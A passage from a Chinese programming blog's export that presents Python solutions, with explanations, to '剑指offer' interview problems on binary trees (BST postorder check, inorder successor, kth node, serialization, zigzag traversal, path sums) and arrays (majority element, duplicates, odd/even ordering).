<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><p>　　二叉搜索树：空树或者二叉树的所有结点比它的左子结点大，比它的右子结点小。在后序遍历得到的序列中，最后一个数字是树的根结点的值。数组中前面的数字可以分为两部分：第一部分是左子树结点的值，它们都比根结点的值小；第二部分是右子树结点的值，它们都比根结点的值大。</p>
<p>　　根据以上规律，采用递归实现，每次根据序列得到根节点，然后找到中间位置，判断中间位置的右边节点的值是否都大于根节点的值，如果是，则继续检查左边的子序列和右边的子序列。否则，不是后序遍历的结果。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">VerifySquenceOfBST</span><span class="params">(self, sequence)</span>:</span></div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> sequence:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">        end = sequence[<span class="number">-1</span>]</div><div class="line">        length = len(sequence)</div><div class="line">        i = <span class="number">0</span></div><div class="line">        <span class="keyword">while</span> i &lt; length - <span class="number">1</span>:  <span class="comment"># 找到中间位置</span></div><div class="line">            <span class="keyword">if</span> sequence[i] &gt; end:</div><div class="line">                <span class="keyword">break</span></div><div class="line">            i += <span class="number">1</span></div><div class="line">        mid = i</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(mid, length - <span class="number">1</span>):</div><div class="line">            <span class="keyword">if</span> sequence[j] &lt; end:  <span class="comment"># 如果右边的小于根节点，则不是后续遍历序列</span></div><div class="line">                <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line">        left = <span class="keyword">True</span></div><div class="line">        <span class="keyword">if</span> mid &gt; <span class="number">0</span>:  <span class="comment"># 再检查左边</span></div><div class="line">            left = self.VerifySquenceOfBST(sequence[:mid])</div><div class="line">        right = <span class="keyword">True</span></div><div class="line">        <span class="keyword">if</span> mid &lt; length - <span class="number">1</span>:  <span class="comment"># 再检查右边</span></div><div class="line">            right = self.VerifySquenceOfBST(sequence[mid:<span class="number">-1</span>])</div><div class="line">        <span class="keyword">return</span> left <span class="keyword">and</span> right</div></pre></td></tr></table></figure>
<h4 id="二叉树的下一个结点"><a href="#二叉树的下一个结点" class="headerlink" title="二叉树的下一个结点"></a>二叉树的下一个结点</h4><h5 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　给定一个二叉树和其中的一个结点，请找出中序遍历顺序的下一个结点并且返回。注意，树中的结点不仅包含左右子结点，同时包含指向父结点的指针。</p>
<h5 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h5><p>　　分为以下几种情况：</p>
<ul>
<li>如果一个节点有右子树，那么它的下一个结点就是它的右子树的最左子节点。</li>
<li>如果一个节点没有右子树<ul>
<li>如果节点是它父节点的左子节点，那么它的下一个节点就是它的父节点。</li>
<li>如果节点是它父节点的右子节点，沿着指向父节点的指针一直向上遍历，直到找到一个是它父节点的左子节点的节点。如果这样的节点存在，那么这个节点的父节点就是我们要找的下一个节点。</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class TreeLinkNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.left = None</span></div><div class="line"><span class="comment">#         self.right = None</span></div><div class="line"><span class="comment">#         self.next = None</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetNext</span><span class="params">(self, pNode)</span>:</span></div><div class="line">        <span class="keyword">if</span> pNode <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">        <span class="keyword">if</span> pNode.right:  <span class="comment"># 有右子树</span></div><div class="line">            pNode = pNode.right</div><div class="line">            <span class="keyword">while</span> pNode.left:</div><div class="line">                pNode = pNode.left</div><div class="line">            <span class="keyword">return</span> pNode</div><div class="line">        <span class="keyword">else</span>:  <span class="comment"># 没有右子树</span></div><div class="line">            <span class="keyword">while</span> pNode.next:</div><div class="line">                <span class="keyword">if</span> pNode.next.left == pNode:</div><div class="line">                    <span class="keyword">return</span> pNode.next</div><div class="line">                pNode = pNode.next</div></pre></td></tr></table></figure>
<h4 id="二叉搜索树的第k个结点"><a href="#二叉搜索树的第k个结点" class="headerlink" title="二叉搜索树的第k个结点"></a>二叉搜索树的第k个结点</h4><h5 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　给定一棵二叉搜索树，请找出其中的第k小的结点。例如， （5，3，7，2，4，6，8）    中，按结点数值大小顺序第三小结点的值为4。</p>
<h5 id="题解-1"><a href="#题解-1" class="headerlink" title="题解 1"></a>题解 1</h5><p>　　中序遍历整棵树，将节点存储在列表中，最后返回列表的第 k 个节点即可。但是，一定要注意边界范围：<code>k=0 和 k&gt;len(lst)</code> 。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class TreeNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.left = None</span></div><div class="line"><span class="comment">#         self.right = None</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="comment"># 返回对应节点TreeNode</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">KthNode</span><span class="params">(self, pRoot, k)</span>:</span></div><div class="line">        <span class="comment"># write code here</span></div><div class="line"></div><div class="line">        <span class="function"><span class="keyword">def</span> <span class="title">inOrder</span><span class="params">(root, order)</span>:</span>  <span class="comment"># 中序遍历</span></div><div class="line">            <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">                <span class="keyword">return</span></div><div class="line">            inOrder(root.left, order)</div><div class="line">            order.append(root)</div><div class="line">            inOrder(root.right, order)</div><div class="line"></div><div class="line">        <span class="keyword">if</span> pRoot <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> k == <span class="number">0</span>:  <span class="comment"># 注意k等于0的情况</span></div><div class="line">            <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">        lst = []</div><div class="line">        inOrder(pRoot, lst)</div><div class="line">        <span class="keyword">if</span> k &gt; len(lst):  <span class="comment"># 注意k大于二叉树节点个数的情况</span></div><div class="line">            <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">        <span class="keyword">return</span> lst[k - <span class="number">1</span>]</div></pre></td></tr></table></figure>
<h5 id="题解-2"><a href="#题解-2" class="headerlink" title="题解 2"></a>题解 2</h5><p>　　同样是中序遍历，但是这里是一边遍历一遍找，找到即停止。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class TreeNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.left = None</span></div><div class="line"><span class="comment">#         self.right = None</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="comment"># 返回对应节点TreeNode</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.res = <span class="keyword">None</span></div><div class="line">        self.cnt = <span class="number">0</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">KthNode</span><span class="params">(self, pRoot, k)</span>:</span></div><div class="line">        <span class="comment"># write code here</span></div><div class="line">        self.inOrder(pRoot, k)</div><div class="line">        <span class="keyword">return</span> self.res</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inOrder</span><span class="params">(self, root, k)</span>:</span>  <span class="comment"># 中序遍历</span></div><div class="line">        <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> self.cnt &gt;= k:  <span class="comment"># 满足条件返回</span></div><div class="line">            <span class="keyword">return</span></div><div class="line">        self.inOrder(root.left, k)</div><div class="line">        self.cnt += <span class="number">1</span>  <span class="comment"># 计数</span></div><div class="line">        <span class="keyword">if</span> self.cnt == k:  <span class="comment"># 找到第k小的数</span></div><div class="line">            self.res = root</div><div class="line">        self.inOrder(root.right, k)</div></pre></td></tr></table></figure>
<h5 id="题解-3"><a href="#题解-3" class="headerlink" title="题解 3"></a>题解 3</h5><p>　　非递归方式实现中序遍历并计数，即可找到第k个节点。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class TreeNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.left = None</span></div><div class="line"><span class="comment">#         self.right = None</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="comment"># 返回对应节点TreeNode</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">KthNode</span><span class="params">(self, pRoot, k)</span>:</span></div><div class="line">        <span class="keyword">if</span> pRoot <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> k == <span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">        cnt = <span class="number">0</span></div><div class="line">        stack = []</div><div class="line">        <span class="keyword">while</span> pRoot <span class="keyword">or</span> stack:  <span class="comment"># 中序遍历</span></div><div class="line">            <span class="keyword">while</span> pRoot:</div><div class="line">                stack.append(pRoot)</div><div class="line">                pRoot = pRoot.left</div><div class="line">            pRoot = stack.pop()</div><div class="line">            cnt += <span class="number">1</span></div><div class="line">            <span class="keyword">if</span> cnt == k:  <span class="comment"># 满足条件返回</span></div><div class="line">                <span class="keyword">return</span> pRoot</div><div class="line">            pRoot = pRoot.right</div><div class="line">        <span class="keyword">return</span> <span class="keyword">None</span></div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Exercise</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Algorithm</tag>
        <tag>剑指offer</tag>
      </tags>
  </entry>
  <entry>
    <title>剑指offer-二叉树(三)</title>
    <url>/2019/09/06/%E5%89%91%E6%8C%87offer-%E4%BA%8C%E5%8F%89%E6%A0%91-%E4%B8%89/</url>
    <content><![CDATA[<p><center>秋招，来了！</center><br><a id="more"></a></p>
<h4 id="序列化二叉树"><a href="#序列化二叉树" class="headerlink" title="序列化二叉树"></a>序列化二叉树</h4><h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　请实现两个函数，分别用来序列化和反序列化二叉树。</p>
<p>　　二叉树的序列化是指：把一棵二叉树按照某种遍历方式的结果以某种格式保存为字符串，从而使得内存中建立起来的二叉树可以持久保存。序列化可以基于先序、中序、后序、层序的二叉树遍历方式来进行修改，序列化的结果是一个字符串，序列化时通过 某种符号表示空节点（#），以 ！ 表示一个结点值的结束（value!）。</p>
<p>　　二叉树的反序列化是指：根据某种遍历顺序得到的序列化字符串结果str，重构二叉树。</p>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><p>　　序列化可以基于先序/中序/后序/按层等遍历方式进行，这里采用先序遍历的方式实现，字符串之间用 “，”隔开。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Serialize</span><span class="params">(self, root)</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> root:</div><div class="line">        <span class="keyword">return</span> <span class="string">'#'</span></div><div class="line">    <span class="keyword">return</span> str(root.val) +<span class="string">','</span> + self.Serialize(root.left) +<span class="string">','</span>+ self.Serialize(root.right)</div></pre></td></tr></table></figure>
<p>　　反序列化：根据某种遍历顺序得到的序列化字符串，重构二叉树。具体思路是按前序遍历“根左右”的顺序，根节点位于其左右子节点的前面，即非空（#）的第一个节点是某子树的根节点，左右子节点在该根节点后，以空节点#为分隔符。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Deserialize</span><span class="params">(self, s)</span>:</span></div><div class="line">    list = s.split(<span class="string">','</span>)</div><div class="line">    <span class="keyword">return</span> self.deserializeTree(list)</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">deserializeTree</span><span class="params">(self, list)</span>:</span></div><div class="line">    <span class="keyword">if</span> len(list)&lt;=<span class="number">0</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">    val = list.pop(<span class="number">0</span>)</div><div class="line">    root = <span class="keyword">None</span></div><div class="line">    <span class="keyword">if</span> val != <span class="string">'#'</span>:</div><div class="line">        root = TreeNode(int(val))</div><div class="line">        root.left = self.deserializeTree(list)</div><div class="line">        root.right = self.deserializeTree(list)</div><div class="line">    <span class="keyword">return</span> root</div></pre></td></tr></table></figure>
<h4 id="按之字形顺序打印二叉树"><a href="#按之字形顺序打印二叉树" class="headerlink" title="按之字形顺序打印二叉树"></a>按之字形顺序打印二叉树</h4><h5 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　请实现一个函数按照之字形打印二叉树，即第一行按照从左到右的顺序打印，第二层按照从右至左的顺序打印，第三行按照从左到右的顺序打印，其他行以此类推。</p>
<h5 id="题解-1"><a href="#题解-1" class="headerlink" title="题解 1"></a>题解 1</h5><p>　　层次遍历。借助队列实现的，先将根结点入栈，判断条件为队列非空，将队列中的队头元素记录下来，并删除结点，如果该队头结点有左子树，将左子树根结点入队，有右子树，将右子树根结点入队。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class TreeNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.left = None</span></div><div class="line"><span class="comment">#         self.right = None</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Print</span><span class="params">(self, pRoot)</span>:</span></div><div class="line">        res = []</div><div class="line">        <span class="keyword">if</span> pRoot <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> res</div><div class="line">        cnt = <span class="number">0</span></div><div class="line">        queue = [pRoot]</div><div class="line">        <span class="keyword">while</span> queue:</div><div class="line">            level = []  <span class="comment"># 保存每一层的节点值</span></div><div class="line">            cnt += <span class="number">1</span></div><div class="line">            length = len(queue)</div><div class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> range(length):</div><div class="line">                node = queue.pop(<span class="number">0</span>)</div><div class="line">                level.append(node.val)</div><div class="line">                <span class="keyword">if</span> node.left:</div><div class="line">                    queue.append(node.left)</div><div class="line">                <span class="keyword">if</span> node.right:</div><div class="line">                    queue.append(node.right)</div><div class="line">            <span class="keyword">if</span> cnt % <span class="number">2</span> == <span class="number">0</span>:  <span class="comment"># 偶数层，从右到左</span></div><div class="line">                level.reverse()</div><div class="line">            res.append(level)  <span class="comment"># 加入结果集</span></div><div class="line">        <span class="keyword">return</span> res</div></pre></td></tr></table></figure>
<h5 id="题解-2"><a href="#题解-2" class="headerlink" title="题解 2"></a>题解 2</h5><p>　　利用两个栈。当我们在打印某一层的节点时，把下一层的节点保存到相应的栈中。如果当前打印的是奇数层，则先保存左子节点再保存右子节点到一个栈中；如果当前打印的是偶数层，则先保存右子节点再保存左子节点到另一个栈中。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class TreeNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.left = None</span></div><div class="line"><span class="comment">#         self.right = None</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Print</span><span class="params">(self, pRoot)</span>:</span></div><div class="line">        res = []</div><div class="line">        <span class="keyword">if</span> pRoot <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> res</div><div class="line">        stack1 = [pRoot]</div><div class="line">        stack2 = []</div><div class="line">        cnt = <span class="number">1</span></div><div class="line">        <span class="keyword">while</span> stack1 <span class="keyword">or</span> stack2:</div><div class="line">            level = []</div><div class="line">            <span class="keyword">if</span> cnt % <span class="number">2</span> == <span class="number">1</span>:  <span class="comment"># 当前层为奇数层（先保存左子节点再保存右子节点）</span></div><div class="line">                <span class="keyword">while</span> stack1:</div><div class="line">                    node = stack1.pop()</div><div class="line">                    level.append(node.val)</div><div class="line">                    <span class="keyword">if</span> node.left:</div><div class="line">                        stack2.append(node.left)</div><div class="line">                    <span class="keyword">if</span> node.right:</div><div class="line">                        stack2.append(node.right)</div><div class="line"></div><div class="line">            <span class="keyword">else</span>:  <span class="comment"># 当前层为偶数层（先保存左子节点再保存右子节点）</span></div><div class="line">                <span class="keyword">while</span> stack2:</div><div class="line">                    node = stack2.pop()</div><div class="line">                    level.append(node.val)</div><div class="line">                    <span class="keyword">if</span> node.right:</div><div class="line">                        stack1.append(node.right)</div><div class="line">                    <span class="keyword">if</span> node.left:</div><div class="line">                        stack1.append(node.left)</div><div class="line"></div><div class="line">            cnt += <span class="number">1</span>  <span class="comment"># 层数统计</span></div><div class="line">            res.append(level)  <span class="comment"># 加入结果集</span></div><div class="line">        <span class="keyword">return</span> res</div></pre></td></tr></table></figure>
<h4 id="二叉树中和为某一值的路径"><a href="#二叉树中和为某一值的路径" class="headerlink" title="二叉树中和为某一值的路径"></a>二叉树中和为某一值的路径</h4><h5 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　输入一颗二叉树的跟节点和一个整数，打印出二叉树中结点值的和为输入整数的所有路径。路径定义为从树的根结点开始往下一直到叶结点所经过的结点形成一条路径。(注意: 在返回值的list中，数组长度大的数组靠前)</p>
<h5 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h5><p>　　使用前序遍历的方式访问节点，使用列表 res 存储全部路径，使用列表 tmp 存储当前路径。遍历二叉树的过程：按前序遍历顺序访问每一个节点。访问每个节点时，将结点添加到 tmp 中。如果当前结点是叶子结点，则判断当前路径是否是符合条件的路径，符合条件的路径存入到 res；如果当前结点不是叶子结点，则递归当前节点的左右子节点。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class TreeNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.left = None</span></div><div class="line"><span class="comment">#         self.right = None</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="comment"># 返回二维列表，内部每个列表表示找到的路径</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">FindPath</span><span class="params">(self, root, expectNumber)</span>:</span></div><div class="line">        self.res = []</div><div class="line">        self.Find(root, expectNumber, [])</div><div class="line">        <span class="keyword">return</span> self.res</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Find</span><span class="params">(self, root, num, tmp)</span>:</span></div><div class="line">        <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span></div><div class="line">        tmp.append(root.val)</div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root.left <span class="keyword">and</span> <span class="keyword">not</span> root.right:  <span class="comment"># 是否是叶子节点</span></div><div class="line">            <span class="keyword">if</span> root.val == num:  <span class="comment"># 路径和为目标值</span></div><div class="line">                self.res.append(tmp[:])</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            self.Find(root.left, num - root.val, tmp)  <span class="comment"># 访问左子节点</span></div><div class="line">            self.Find(root.right, num - root.val, tmp)  <span class="comment"># 访问右子节点</span></div><div class="line">        tmp.pop()</div></pre></td></tr></table></figure>
<p>　　思路一样，代码简化的版本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class TreeNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.left = None</span></div><div class="line"><span class="comment">#         self.right = None</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="comment"># 返回二维列表，内部每个列表表示找到的路径</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">FindPath</span><span class="params">(self, root, expectNumber)</span>:</span></div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</div><div class="line">            <span class="keyword">return</span> []</div><div class="line">        <span class="keyword">if</span> root.val == expectNumber <span class="keyword">and</span> <span class="keyword">not</span> root.left <span class="keyword">and</span> <span class="keyword">not</span> root.right:</div><div class="line">            <span class="keyword">return</span> [[root.val]]</div><div class="line">        res = []</div><div class="line">        left = self.FindPath(root.left, expectNumber - root.val)</div><div class="line">        right = self.FindPath(root.right, expectNumber - root.val)</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> left + right:</div><div class="line">            res.append([root.val] + i)</div><div class="line">        <span class="keyword">return</span> res</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Exercise</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Algorithm</tag>
        <tag>剑指offer</tag>
      </tags>
  </entry>
  <entry>
    <title>剑指offer-数组</title>
    <url>/2019/09/01/%E5%89%91%E6%8C%87offer-%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<p><center>秋招，来了！</center><br><a id="more"></a></p>
<h4 id="数组中出现次数超过一半的数字"><a href="#数组中出现次数超过一半的数字" class="headerlink" title="数组中出现次数超过一半的数字"></a>数组中出现次数超过一半的数字</h4><h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　数组中有一个数字出现的次数超过数组长度的一半，请找出这个数字。例如输入一个长度为9的数组{1,2,3,2,2,2,5,4,2}。由于数字2在数组中出现了5次，超过数组长度的一半，因此输出2。如果不存在则输出0。</p>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><p>　　参考以前写的博客：<a href="http://fanzhenyu.cn/2019/04/27/找出数组中出现次数超过一半的数/" target="_blank" rel="external">找出数组中出现次数超过一半的数</a></p>
<h4 id="数组中重复的数字"><a href="#数组中重复的数字" class="headerlink" title="数组中重复的数字"></a>数组中重复的数字</h4><h5 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　在一个长度为n的数组里的所有数字都在0到n-1的范围内。 数组中某些数字是重复的，但不知道有几个数字是重复的。也不知道每个数字重复几次。请找出数组中任意一个重复的数字。 例如，如果输入长度为7的数组{2,3,1,0,2,5,3}，那么对应的输出是第一个重复的数字2。</p>
<h5 id="题解-1"><a href="#题解-1" class="headerlink" title="题解 1"></a>题解 1</h5><p>　　遍历数组，使用 Python 的关键字 in 判断该元素是否在其之后还出现过，如果是则直接返回。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="comment"># 这里要特别注意~找到任意重复的一个值并赋值到duplication[0]</span></div><div class="line">    <span class="comment"># 函数返回True/False</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">duplicate</span><span class="params">(self, numbers, duplication)</span>:</span></div><div class="line">        length = len(numbers)</div><div class="line">        <span class="keyword">if</span> numbers <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> length==<span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</div><div class="line">            <span class="keyword">if</span> numbers[i] <span class="keyword">in</span> numbers[i+<span class="number">1</span>:]:</div><div class="line">                duplication[<span class="number">0</span>] = numbers[i]</div><div class="line">                <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div></pre></td></tr></table></figure>
<h5 id="题解-2"><a href="#题解-2" class="headerlink" title="题解 2"></a>题解 2</h5><p>　　用布尔列表表示对应的值是否已经出现过 ，如果是则返回该值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="comment"># 这里要特别注意~找到任意重复的一个值并赋值到duplication[0]</span></div><div class="line">    <span class="comment"># 函数返回True/False</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">duplicate</span><span class="params">(self, numbers, duplication)</span>:</span></div><div class="line">        length = len(numbers)</div><div class="line">        <span class="keyword">if</span> numbers <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> length == <span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line">        bool_list = [<span class="keyword">False</span>] * length</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</div><div class="line">            <span class="keyword">if</span> bool_list[numbers[i]]:  <span class="comment"># 重复出现</span></div><div class="line">                duplication[<span class="number">0</span>] = numbers[i]</div><div class="line">                <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">            bool_list[numbers[i]] = <span class="keyword">True</span>  <span class="comment"># 标记为已经出现</span></div><div class="line"></div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div></pre></td></tr></table></figure>
<h5 id="题解-3"><a href="#题解-3" class="headerlink" title="题解 3"></a>题解 3</h5><p>　　由于数组长度为 n，且所有数字都在 0 到 n-1 的范围内，因此考虑利用数组下标。从下标 0 开始，对每个元素，若 <code>numbers[i]</code> 不等于 <code>i</code>，则交换 <code>numbers[i]</code> 和 <code>numbers[numbers[i]]</code>，直至 <code>i</code> 和 <code>numbers[i]</code> 相等继续循环，或 <code>numbers[i]</code> 和 <code>numbers[numbers[i]]</code> 相等即遇到重复元素返回 True。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="comment"># 这里要特别注意~找到任意重复的一个值并赋值到duplication[0]</span></div><div class="line">    <span class="comment"># 函数返回True/False</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">duplicate</span><span class="params">(self, numbers, duplication)</span>:</span></div><div class="line">        <span class="comment"># write code here</span></div><div class="line">        length = len(numbers)</div><div class="line">        <span class="keyword">if</span> numbers <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> length == <span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</div><div class="line">            <span class="keyword">while</span> i != numbers[i]:</div><div class="line">                <span class="keyword">if</span> numbers[i] == numbers[numbers[i]]:</div><div class="line">                    duplication[<span class="number">0</span>] = numbers[i]</div><div class="line">                    <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">                tmp = numbers[numbers[i]]</div><div class="line">                numbers[numbers[i]] = numbers[i]</div><div class="line">                numbers[i] = tmp</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div></pre></td></tr></table></figure>
<h4 id="调整数组顺序使奇数位于偶数前面"><a href="#调整数组顺序使奇数位于偶数前面" class="headerlink" title="调整数组顺序使奇数位于偶数前面"></a>调整数组顺序使奇数位于偶数前面</h4><h5 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　输入一个整数数组，实现一个函数来调整该数组中数字的顺序，使得所有的奇数位于数组的前半部分，所有的偶数位于数组的后半部分，并保证奇数和奇数，偶数和偶数之间的相对位置不变。</p>
<h5 id="题解-1-1"><a href="#题解-1-1" class="headerlink" title="题解 1"></a>题解 1</h5><p>　　一次遍历，判断每个数的奇偶性，然后使用两个列表来存储奇数和偶数，最后将两个列表合并。</p>
